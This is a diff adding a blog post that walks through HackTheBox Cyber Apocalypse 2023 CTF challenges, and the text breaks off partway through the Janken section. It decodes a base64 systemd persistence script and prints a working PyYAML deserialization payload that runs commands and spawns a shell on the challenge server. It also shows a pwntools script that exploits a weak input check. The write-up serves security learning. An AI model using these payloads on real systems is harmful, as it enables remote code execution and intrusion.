@@ -1,0 +1,1408 @@
+<!DOCTYPE html>
+<html lang="en-us"><head><meta charset="utf-8">
+<meta http-equiv="content-type" content="text/html">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<title itemprop="name">HackTheBox_Cyber_Apocalypse_2023 | Spencer&#39;s blog</title>
+<meta property="og:title" content="HackTheBox_Cyber_Apocalypse_2023 | Spencer&#39;s blog" />
+<meta name="twitter:title" content="HackTheBox_Cyber_Apocalypse_2023 | Spencer&#39;s blog" />
+<meta itemprop="name" content="HackTheBox_Cyber_Apocalypse_2023 | Spencer&#39;s blog" />
+<meta name="application-name" content="HackTheBox_Cyber_Apocalypse_2023 | Spencer&#39;s blog" />
+<meta property="og:site_name" content="Awesome hugo blog" />
+
+<meta name="description" content="Minimal Hugo blog theme with light and dark mode support">
+<meta itemprop="description" content="Minimal Hugo blog theme with light and dark mode support" />
+<meta property="og:description" content="Minimal Hugo blog theme with light and dark mode support" />
+<meta name="twitter:description" content="Minimal Hugo blog theme with light and dark mode support" />
+
+<meta property="og:locale" content="en-us" />
+<meta name="language" content="en-us" />
+
+
+
+  <meta itemprop="image" content="https://spencerja.github.io/" />
+  <meta property="og:image" content="https://spencerja.github.io/" />
+  <meta name="twitter:image" content="https://spencerja.github.io/" />
+  <meta name="twitter:image:src" content="https://spencerja.github.io/" />
+
+
+
+
+    
+    
+    
+    
+
+    <meta property="og:type" content="article" />
+    <meta property="og:article:published_time" content=2023-06-19T19:01:05-0500 />
+    <meta property="article:published_time" content=2023-06-19T19:01:05-0500 />
+
+    
+
+    
+
+    <script defer type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "Article",
+        "headline": "HackTheBox_Cyber_Apocalypse_2023",
+        "author": {
+        "@type": "Person",
+        "name": ""
+        },
+        "datePublished": "2023-06-19",
+        "description": "",
+        "wordCount":  7777 ,
+        "mainEntityOfPage": "True",
+        "dateModified": "2023-06-19",
+        "image": {
+        "@type": "imageObject",
+        "url": ""
+        },
+        "publisher": {
+        "@type": "Organization",
+        "name": "Spencer\u0027s blog"
+        }
+    }
+    </script>
+
+
+<meta name="generator" content="Hugo 0.112.3">
+
+    
+
+    <link rel="canonical" href="https://spencerja.github.io/posts/hackthebox_cyber_apocalypse_2023/">
+    <link href="/style.min.9fd18eb5ac0fcc46f9be43e845311f6c6928d9bb568c6d278dae045f7b3fa666.css" rel="stylesheet">
+    <link href="/code-highlight.min.706d31975fec544a864cb7f0d847a73ea55ca1df91bf495fd12a177138d807cf.css" rel="stylesheet">
+
+    
+    <link rel="apple-touch-icon" sizes="180x180" href="/icons/apple-touch-icon.png">
+    <link rel="icon" type="image/png" sizes="32x32" href="/icons/favicon-32x32.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="/icons/favicon-16x16.png">
+    <link rel="mask-icon" href="/icons/safari-pinned-tab.svg">
+    <link rel="shortcut icon" href="/favicon.ico">
+
+
+
+
+<link rel="manifest" href="https://spencerja.github.io/site.webmanifest">
+
+<meta name="msapplication-config" content="/browserconfig.xml">
+<meta name="msapplication-TileColor" content="#b40056">
+<meta name="theme-color" content="#434648">
+
+    
+    <link rel="icon" type="image/svg+xml" href="/icons/favicon.svg">
+
+    
+    </head>
+<body data-theme = "auto" class="notransition">
+
+<script src="/js/theme.min.8961c317c5b88b953fe27525839672c9343f1058ab044696ca225656c8ba2ab0.js" integrity="sha256-iWHDF8W4i5U/4nUlg5ZyyTQ/EFirBEaWyiJWVsi6KrA="></script>
+
+<div class="navbar" role="navigation">
+    <nav class="menu" aria-label="Main Navigation">
+        <a href="https://spencerja.github.io/" class="logo">
+            <svg xmlns="http://www.w3.org/2000/svg" width="25" height="25" 
+viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" 
+stroke-linejoin="round" class="feather feather-home">
+<title>Home</title>
+<path d="M3 9l9-7 9 7v11a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2z"></path>
+<polyline points="9 22 9 12 15 12 15 22"></polyline>
+</svg>
+        </a>
+        <input type="checkbox" id="menu-trigger" class="menu-trigger" />
+        <label for="menu-trigger">
+            <span class="menu-icon">
+                <svg xmlns="http://www.w3.org/2000/svg" width="25" height="25" stroke="currentColor" fill="none" viewBox="0 0 14 14"><title>Menu</title><path stroke-linecap="round" stroke-linejoin="round" d="M10.595 7L3.40726 7"></path><path stroke-linecap="round" stroke-linejoin="round" d="M10.5096 3.51488L3.49301 3.51488"></path><path stroke-linecap="round" stroke-linejoin="round" d="M10.5096 10.4851H3.49301"></path><path stroke-linecap="round" stroke-linejoin="round" d="M0.5 12.5V1.5C0.5 0.947715 0.947715 0.5 1.5 0.5H12.5C13.0523 0.5 13.5 0.947715 13.5 1.5V12.5C13.5 13.0523 13.0523 13.5 12.5 13.5H1.5C0.947715 13.5 0.5 13.0523 0.5 12.5Z"></path></svg>
+            </span>
+        </label>
+
+        <div class="trigger">
+            <ul class="trigger-container">
+                
+                
+                <li>
+                    <a class="menu-link active" href="/posts/">
+                        Posts
+                    </a>
+                    
+                </li>
+                
+                <li>
+                    <a class="menu-link " href="/awards/">
+                        Trophy Room
+                    </a>
+                    
+                </li>
+                
+                <li class="menu-separator">
+                    <span>|</span>
+                </li>
+            </ul>
+            <a id="mode" href="#">
+                <svg xmlns="http://www.w3.org/2000/svg" class="mode-sunny" width="21" height="21" viewBox="0 0 14 14" stroke-width="1">
+<title>LIGHT</title><g><circle cx="7" cy="7" r="2.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></circle><line x1="7" y1="0.5" x2="7" y2="2.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="2.4" y1="2.4" x2="3.82" y2="3.82" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="0.5" y1="7" x2="2.5" y2="7" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="2.4" y1="11.6" x2="3.82" y2="10.18" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="7" y1="13.5" x2="7" y2="11.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="11.6" y1="11.6" x2="10.18" y2="10.18" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="13.5" y1="7" x2="11.5" y2="7" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="11.6" y1="2.4" x2="10.18" y2="3.82" fill="none" stroke-linecap="round" stroke-linejoin="round"></line></g></svg>
+                <svg xmlns="http://www.w3.org/2000/svg" class="mode-moon" width="21" height="21" viewBox="0 0 14 14" stroke-width="1">
+<title>DARK</title><g><circle cx="7" cy="7" r="2.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></circle><line x1="7" y1="0.5" x2="7" y2="2.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="2.4" y1="2.4" x2="3.82" y2="3.82" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="0.5" y1="7" x2="2.5" y2="7" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="2.4" y1="11.6" x2="3.82" y2="10.18" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="7" y1="13.5" x2="7" y2="11.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="11.6" y1="11.6" x2="10.18" y2="10.18" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="13.5" y1="7" x2="11.5" y2="7" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="11.6" y1="2.4" x2="10.18" y2="3.82" fill="none" stroke-linecap="round" stroke-linejoin="round"></line></g></svg>
+            </a>
+        </div>
+    </nav>
+</div>
+
+<div class="wrapper post">
+    <main class="page=content-top" aria-label="Content">
+        <article>
+            <header class="header">
+                <h1 class="header-title">HackTheBox_Cyber_Apocalypse_2023</h1>
+                
+                <div class="post-meta">
+                    <time datetime="2023-06-19T19:01:05-05:00" itemprop="datePublished"> Jun 19, 2023 </time>
+                </div>
+            </header>
+            <nav class="toc">
+		    <h3>Table of Contents</h3>
+                <nav id="TableOfContents">
+  <ul>
+    <li><a href="#forensics">Forensics</a>
+      <ul>
+        <li><a href="#extraterrestrial-persistence">Extraterrestrial Persistence</a></li>
+      </ul>
+    </li>
+    <li><a href="#misc">Misc</a>
+      <ul>
+        <li><a href="#hijack">Hijack</a></li>
+        <li><a href="#janken">Janken</a></li>
+        <li><a href="#nehebkaus-trap">Nehebkaus Trap</a></li>
+        <li><a href="#persistence">Persistence</a></li>
+        <li><a href="#restricted">Restricted</a></li>
+      </ul>
+    </li>
+    <li><a href="#pwn">Pwn</a>
+      <ul>
+        <li><a href="#labyrinth">Labyrinth</a></li>
+      </ul>
+    </li>
+    <li><a href="#web">Web</a>
+      <ul>
+        <li><a href="#drobots">Drobots</a></li>
+        <li><a href="#gunhead">Gunhead</a></li>
+        <li><a href="#orbital">Orbital</a></li>
+        <li><a href="#passman">Passman</a></li>
+        <li><a href="#trapped-source">Trapped Source</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav>
+            </nav><div class="page-content">
+                <h2 id="forensics">Forensics</h2>
+<h3 id="extraterrestrial-persistence">Extraterrestrial Persistence</h3>
+<blockquote>
+<p>There is a rumor that aliens have developed a persistence mechanism that is impossible to detect. After investigating her recently compromised Linux server, Pandora found a possible sample of this mechanism. Can you analyze it and find out how they install their persistence?
+<strong>Difficulty: very easy</strong></p>
+</blockquote>
+<hr>
+<p>For this challenge we are provided with a small <code>persistence.sh</code> script. Within the code, we see base64 encoded information being directed to a file service.service, then being called:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="nb">echo</span> -e <span class="s2">&#34;W1VuaXRdCkRlc2NyaXB0aW9uPUhUQnt0aDNzM180bDEzblNfNHIzX3MwMDAwMF9iNHMxY30KQWZ0ZXI9bmV0d29yay50YXJnZXQgbmV0d29yay1vbmxpbmUudGFyZ2V0CgpbU2VydmljZV0KVHlwZT1vbmVzaG90ClJlbWFpbkFmdGVyRXhpdD15ZXMKCkV4ZWNTdGFydD0vdXNyL2xvY2FsL2Jpbi9zZXJ2aWNlCkV4ZWNTdG9wPS91c3IvbG9jYWwvYmluL3NlcnZpY2UKCltJbnN0YWxsXQpXYW50ZWRCeT1tdWx0aS11c2VyLnRhcmdldA==&#34;</span><span class="p">|</span>base64 --decode &gt; /usr/lib/systemd/system/service.service
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">systemctl <span class="nb">enable</span> service.service
+</span></span></code></pre></div><p>We can decode this base64 ourselves and have a better idea on what is being done</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ <span class="nb">echo</span> -e <span class="s2">&#34;W1VuaXRdCkRlc2NyaXB0aW9uPUhUQnt0aDNzM180bDEzblNfNHIzX3MwMDAwMF9iNHMxY30KQWZ0ZXI9bmV0d29yay50YXJnZXQgbmV0d29yay1vbmxpbmUudGFyZ2V0CgpbU2VydmljZV0KVHlwZT1vbmVzaG90ClJlbWFpbkFmdGVyRXhpdD15ZXMKCkV4ZWNTdGFydD0vdXNyL2xvY2FsL2Jpbi9zZXJ2aWNlCkV4ZWNTdG9wPS91c3IvbG9jYWwvYmluL3NlcnZpY2UKCltJbnN0YWxsXQpXYW50ZWRCeT1tdWx0aS11c2VyLnRhcmdldA==&#34;</span><span class="p">|</span>base64 --decode
+</span></span><span class="line"><span class="cl"><span class="o">[</span>Unit<span class="o">]</span>
+</span></span><span class="line"><span class="cl"><span class="nv">Description</span><span class="o">=</span>HTB<span class="o">{</span>th3s3_4l13nS_4r3_s00000_b4s1c<span class="o">}</span>
+</span></span><span class="line"><span class="cl"><span class="nv">After</span><span class="o">=</span>network.target network-online.target
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">[</span>Service<span class="o">]</span>
+</span></span><span class="line"><span class="cl"><span class="nv">Type</span><span class="o">=</span>oneshot
+</span></span><span class="line"><span class="cl"><span class="nv">RemainAfterExit</span><span class="o">=</span>yes
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nv">ExecStart</span><span class="o">=</span>/usr/local/bin/service
+</span></span><span class="line"><span class="cl"><span class="nv">ExecStop</span><span class="o">=</span>/usr/local/bin/service
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">[</span>Install<span class="o">]</span>
+</span></span><span class="line"><span class="cl"><span class="nv">WantedBy</span><span class="o">=</span>multi-user.target
+</span></span></code></pre></div><p>Just like that, we find the flag: <code>HTB{th3s3_4l13nS_4r3_s00000_b4s1c}</code></p>
+<h2 id="misc">Misc</h2>
+<h3 id="hijack">Hijack</h3>
+<blockquote>
+<p>The security of the alien spacecrafts did not prove very robust, and you have gained access to an interface allowing you to upload a new configuration to their ship&rsquo;s Thermal Control System. Can you take advantage of the situation without raising any suspicion?
+<strong>Difficulty: easy</strong></p>
+</blockquote>
+<hr>
+<p>We are given an IP address and port to nc into:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">nc 159.65.94.38 <span class="m">30109</span>
+</span></span></code></pre></div><p>Upon connection, we are greeted with a simple menu system:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">&lt;------<span class="o">[</span>TCS<span class="o">]</span>------&gt;
+</span></span><span class="line"><span class="cl"><span class="o">[</span>1<span class="o">]</span> Create config                                                                                                                                                                                                                          
+</span></span><span class="line"><span class="cl"><span class="o">[</span>2<span class="o">]</span> Load config                                                                                                                                                                                                                            
+</span></span><span class="line"><span class="cl"><span class="o">[</span>3<span class="o">]</span> Exit
+</span></span></code></pre></div><p>Trying to create a config, we see very few input checks in place:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">&gt; <span class="m">1</span>                                                                                                                                                                                                                                        
+</span></span><span class="line"><span class="cl">                                                                                                                                                                                                                                           
+</span></span><span class="line"><span class="cl">- Creating new config -                                                                                                                                                                                                                    
+</span></span><span class="line"><span class="cl">Temperature units <span class="o">(</span>F/C/K<span class="o">)</span>: A                                                                                                                                                                                                               
+</span></span><span class="line"><span class="cl">Propulsion Components Target Temperature : B                                                                                                                                                                                               
+</span></span><span class="line"><span class="cl">Solar Array Target Temperature : C                                                                                                                                                                                                         
+</span></span><span class="line"><span class="cl">Infrared Spectrometers Target Temperature : D                                                                                                                                                                                              
+</span></span><span class="line"><span class="cl">Auto Calibration <span class="o">(</span>ON/OFF<span class="o">)</span> : E                                                                                                                                                                                                              
+</span></span><span class="line"><span class="cl">                                                                                                                                                                                                                                           
+</span></span><span class="line"><span class="cl">Serialized config: ISFweXRob24vb2JqZWN0Ol9fbWFpbl9fLkNvbmZpZyB7SVJfc3BlY3Ryb21ldGVyX3RlbXA6IEQsIGF1dG9fY2FsaWJyYXRpb246IEUsIHByb3B1bHNpb25fdGVtcDogQiwKICBzb2xhcl9hcnJheV90ZW1wOiBDLCB1bml0czogQX0K                                        
+</span></span><span class="line"><span class="cl">Uploading to ship...                                                                                                                                                                                                                       
+</span></span><span class="line"><span class="cl">                                                                                                                                                                                                                                              
+</span></span></code></pre></div><p>The returned serialized config looks to be base64 encoded, so let&rsquo;s see what this contains:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ <span class="nb">echo</span> <span class="s2">&#34;ISFweXRob24vb2JqZWN0Ol9fbWFpbl9fLkNvbmZpZyB7SVJfc3BlY3Ryb21ldGVyX3RlbXA6IEQsIGF1dG9fY2FsaWJyYXRpb246IEUsIHByb3B1bHNpb25fdGVtcDogQiwKICBzb2xhcl9hcnJheV90ZW1wOiBDLCB1bml0czogQX0K&#34;</span> <span class="p">|</span> base64 -d
+</span></span><span class="line"><span class="cl">!!python/object:__main__.Config <span class="o">{</span>IR_spectrometer_temp: D, auto_calibration: E, propulsion_temp: B,
+</span></span><span class="line"><span class="cl">  solar_array_temp: C, units: A<span class="o">}</span>
+</span></span></code></pre></div><p>It looks like our config options that we created. However, loading this config fails even though creation was successful. A quick google search indicates that this <code>!!python/object:__main__</code> syntax is from PyYAML. There is a page on hacktricks that details how one might go about exploiting this: <a href="https://book.hacktricks.xyz/pentesting-web/deserialization/python-yaml-deserialization">https://book.hacktricks.xyz/pentesting-web/deserialization/python-yaml-deserialization</a></p>
+<p>Under RCE category, we see it might be possible to execute shell command with the right syntax.
+Testing the exploit:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ <span class="nb">echo</span> <span class="s1">&#39;!!python/object/apply:subprocess.Popen                                                                                                                                                       
+</span></span></span><span class="line"><span class="cl"><span class="s1">- ls&#39;</span> <span class="p">|</span> base64
+</span></span><span class="line"><span class="cl"><span class="nv">ISFweXRob24vb2JqZWN0L2FwcGx5OnN1YnByb2Nlc3MuUG9wZW4KLSBscwo</span><span class="o">=</span>
+</span></span></code></pre></div><p>Loading base64 config:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">&lt;------<span class="o">[</span>TCS<span class="o">]</span>------&gt;
+</span></span><span class="line"><span class="cl"><span class="o">[</span>1<span class="o">]</span> Create config                                                                                                                                                                                                                          
+</span></span><span class="line"><span class="cl"><span class="o">[</span>2<span class="o">]</span> Load config                                                                                                                                                                                                                            
+</span></span><span class="line"><span class="cl"><span class="o">[</span>3<span class="o">]</span> Exit                                                                                                                                                                                                                                   
+</span></span><span class="line"><span class="cl">&gt; <span class="m">2</span>                                                                                                                                                                                                                                        
+</span></span><span class="line"><span class="cl">                                                                                                                                                                                                                                           
+</span></span><span class="line"><span class="cl">Serialized config to load: <span class="nv">ISFweXRob24vb2JqZWN0L2FwcGx5OnN1YnByb2Nlc3MuUG9wZW4KLSBscwo</span><span class="o">=</span>                                                                                                                                                    
+</span></span><span class="line"><span class="cl">** Success **                                                                                                                                                                                                                              
+</span></span><span class="line"><span class="cl">Uploading to ship...                                                                                                                                                                                                                       
+</span></span><span class="line"><span class="cl">                                                                                                                                                                                                                                           
+</span></span><span class="line"><span class="cl">&lt;------<span class="o">[</span>TCS<span class="o">]</span>------&gt;                                                                                                                                                                                                                        
+</span></span><span class="line"><span class="cl"><span class="o">[</span>1<span class="o">]</span> Create config                                                                                                                                                                                                                          
+</span></span><span class="line"><span class="cl"><span class="o">[</span>2<span class="o">]</span> Load config                                                                                                                                                                                                                            
+</span></span><span class="line"><span class="cl"><span class="o">[</span>3<span class="o">]</span> Exit                                                                                                                                                                                                                                   
+</span></span><span class="line"><span class="cl">&gt; chall.py                                                                                                                                                                                                                                 
+</span></span><span class="line"><span class="cl">flag.txt                                                                                                                                                                                                                                   
+</span></span><span class="line"><span class="cl">hijack.py
+</span></span></code></pre></div><p><code>ls</code> is successfully executing! Now to read the flag.</p>
+<p>I had some trouble producing a payload that would simply cat the flag.txt file. Presumably, my payload setup was not suitable for a command with several words (cat flag.txt), so to work around this I simply spawned a shell:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="err">!!</span><span class="n">python</span><span class="o">/</span><span class="nb">object</span><span class="o">/</span><span class="n">apply</span><span class="p">:</span><span class="n">subprocess</span><span class="o">.</span><span class="n">Popen</span>
+</span></span><span class="line"><span class="cl"><span class="o">-</span> <span class="n">sh</span>
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ cat payload <span class="p">|</span> base64 
+</span></span><span class="line"><span class="cl"><span class="nv">ISFweXRob24vb2JqZWN0L2FwcGx5OnN1YnByb2Nlc3MuUG9wZW4KLSBzaAo</span><span class="o">=</span>
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">&lt;------<span class="o">[</span>TCS<span class="o">]</span>------&gt;
+</span></span><span class="line"><span class="cl"><span class="o">[</span>1<span class="o">]</span> Create config                                                                                                   
+</span></span><span class="line"><span class="cl"><span class="o">[</span>2<span class="o">]</span> Load config                                                                                                     
+</span></span><span class="line"><span class="cl"><span class="o">[</span>3<span class="o">]</span> Exit                                                                                                            
+</span></span><span class="line"><span class="cl">&gt; <span class="m">2</span>                                                                                                                 
+</span></span><span class="line"><span class="cl">                                                                                                                    
+</span></span><span class="line"><span class="cl">Serialized config to load: <span class="nv">ISFweXRob24vb2JqZWN0L2FwcGx5OnN1YnByb2Nlc3MuUG9wZW4KLSBzaAo</span><span class="o">=</span>                             
+</span></span><span class="line"><span class="cl">** Success **                                                                                                       
+</span></span><span class="line"><span class="cl">Uploading to ship...                                                                                                
+</span></span><span class="line"><span class="cl">                                                                                                                    
+</span></span><span class="line"><span class="cl">&lt;------<span class="o">[</span>TCS<span class="o">]</span>------&gt;                                                                                                 
+</span></span><span class="line"><span class="cl"><span class="o">[</span>1<span class="o">]</span> Create config                                                                                                   
+</span></span><span class="line"><span class="cl"><span class="o">[</span>2<span class="o">]</span> Load config                                                                                                     
+</span></span><span class="line"><span class="cl"><span class="o">[</span>3<span class="o">]</span> Exit                                                                                                            
+</span></span><span class="line"><span class="cl">&gt; cat flag.txt                                                                                                      
+</span></span><span class="line"><span class="cl">HTB<span class="o">{</span>1s_1t_ju5t_m3_0r_iS_1t_g3tTing_h0t_1n_h3r3?<span class="o">}</span>
+</span></span></code></pre></div><p><code>HTB{1s_1t_ju5t_m3_0r_iS_1t_g3tTing_h0t_1n_h3r3?}</code></p>
+<h3 id="janken">Janken</h3>
+<blockquote>
+<p>As you approach an ancient tomb, you&rsquo;re met with a wise guru who guards its entrance. In order to proceed, he challenges you to a game of Janken, a variation of rock paper scissors with a unique twist. But there&rsquo;s a catch: you must win 100 rounds in a row to pass. Fail to do so, and you&rsquo;ll be denied entry.
+<strong>Difficulty: easy</strong></p>
+</blockquote>
+<hr>
+<p>In this challenge we are given a compiled binary called janken. Upon running it, we can view the rules for the game:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ ./janken 
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">                                                                                                                    
+</span></span><span class="line"><span class="cl">                         ▛▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▜                                                                         
+</span></span><span class="line"><span class="cl">                         ▌   じ ゃ ん 拳  ▐                                                                         
+</span></span><span class="line"><span class="cl">                         ▙▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▟                                                                         
+</span></span><span class="line"><span class="cl">                                                                                                                    
+</span></span><span class="line"><span class="cl">                                                                                                                    
+</span></span><span class="line"><span class="cl">1. ℙ ∟ ₳ Ұ                                                                                                          
+</span></span><span class="line"><span class="cl">2. ℜ ℧ ∟ Ӗ ⅀                                                                                                        
+</span></span><span class="line"><span class="cl">                                                                                                                    
+</span></span><span class="line"><span class="cl">&gt;&gt; <span class="m">2</span>                                                                                                                
+</span></span><span class="line"><span class="cl">                                                                                                                    
+</span></span><span class="line"><span class="cl">▛▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▜                                          
+</span></span><span class="line"><span class="cl">▚  <span class="o">[</span>*<span class="o">]</span> Rock     is called <span class="s2">&#34;Guu&#34;</span>   <span class="o">(</span>ぐう<span class="o">)</span>.                                ▞                                          
+</span></span><span class="line"><span class="cl">▞  <span class="o">[</span>*<span class="o">]</span> Scissors is called <span class="s2">&#34;Choki&#34;</span> <span class="o">(</span>ちょき<span class="o">)</span>.                              ▚                                          
+</span></span><span class="line"><span class="cl">▚  <span class="o">[</span>*<span class="o">]</span> Paper    is called <span class="s2">&#34;Paa&#34;</span>   <span class="o">(</span>ぱあ<span class="o">)</span>.                                ▞                                          
+</span></span><span class="line"><span class="cl">▞                                                                        ▚                                          
+</span></span><span class="line"><span class="cl">▚  1. Rock &gt; scissors, scissors &gt; paper, paper &gt; rock.                   ▞                                          
+</span></span><span class="line"><span class="cl">▞  2. You have to win <span class="o">[</span>100<span class="o">]</span> <span class="nb">times</span> in a row in order to get the prize. 🏆 ▚                                          
+</span></span><span class="line"><span class="cl">▙▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▟ 
+</span></span></code></pre></div><p>To win, we must win 100 games of rock paper scissors in a row. If left up to chance, this is not realistic. There must be a way to force a win. I recall seeing this same problem presented in another CTF competition, picoCTF 2022. (RPS in Binary Exploitation category). In that challenge, the win condition was only checking if the player&rsquo;s input contained the winning string. So, by playing all 3 options at once you were guaranteed to win. We can try that here as well:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">&gt;&gt; <span class="m">1</span>                                                                                                                
+</span></span><span class="line"><span class="cl"><span class="o">[</span>!<span class="o">]</span> Let the game begin! 🎉                                                                                          
+</span></span><span class="line"><span class="cl">                                                                                                                    
+</span></span><span class="line"><span class="cl">                                                                                                                    
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Round <span class="o">[</span>1<span class="o">]</span>:                                                                                                      
+</span></span><span class="line"><span class="cl">                                                                                                                    
+</span></span><span class="line"><span class="cl">Choose:                                                                                                             
+</span></span><span class="line"><span class="cl">                                                                                                                    
+</span></span><span class="line"><span class="cl">Rock 👊                                                                                                             
+</span></span><span class="line"><span class="cl">Scissors ✂                                                                                                          
+</span></span><span class="line"><span class="cl">Paper 📜                                                                                                            
+</span></span><span class="line"><span class="cl">                                                                                                                    
+</span></span><span class="line"><span class="cl">&gt;&gt; rock,paper,scissors                                                                                              
+</span></span><span class="line"><span class="cl">                                                                                                                    
+</span></span><span class="line"><span class="cl"><span class="o">[</span>!<span class="o">]</span> Guru<span class="err">&#39;</span>s choice: scissors                                                                                         
+</span></span><span class="line"><span class="cl"><span class="o">[</span>!<span class="o">]</span> Your  choice: rock,paper,scissors                                                                               
+</span></span><span class="line"><span class="cl">                                                                                                                    
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> You won this round! Congrats!                                                                                   
+</span></span><span class="line"><span class="cl">                                                                                                                    
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Round <span class="o">[</span>2<span class="o">]</span>: 
+</span></span></code></pre></div><p>The syntax was a little picky, but we see a guaranteed winning combination with <code>rock,paper,scissors</code>.</p>
+<p>Writing out <code>rock,paper,scissors</code> 100 times in a row is boring and tedious, so I channeled my inner programmer and spent twice as long making a script that will do it for me:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">p</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s1">&#39;178.62.64.13&#39;</span><span class="p">,</span> <span class="mi">31174</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">win</span> <span class="o">=</span> <span class="s1">&#39;rock,paper,scissors&#39;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">#Start game 1 and chain</span>
+</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s1">&#39;1&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">#Looping sendline is too fast, so I wait for interactive marker &gt;&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">100</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s1">&#39;&gt;&gt;&#39;</span><span class="p">,</span><span class="n">win</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">response</span> <span class="o">=</span> <span class="n">p</span><span class="o">.</span><span class="n">recvallS</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">response</span><span class="p">)</span>
+</span></span></code></pre></div><p>Now to acquire the flag in extra speedy fashion:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ python RPS.py
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Opening connection to 178.62.64.13 on port 31174: Done
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Receiving all data: Done <span class="o">(</span>223B<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Closed connection to 178.62.64.13 port <span class="m">31174</span>
+</span></span><span class="line"><span class="cl"> 
+</span></span><span class="line"><span class="cl"><span class="o">[</span>!<span class="o">]</span> Guru<span class="err">&#39;</span>s choice: rock                                                                                             
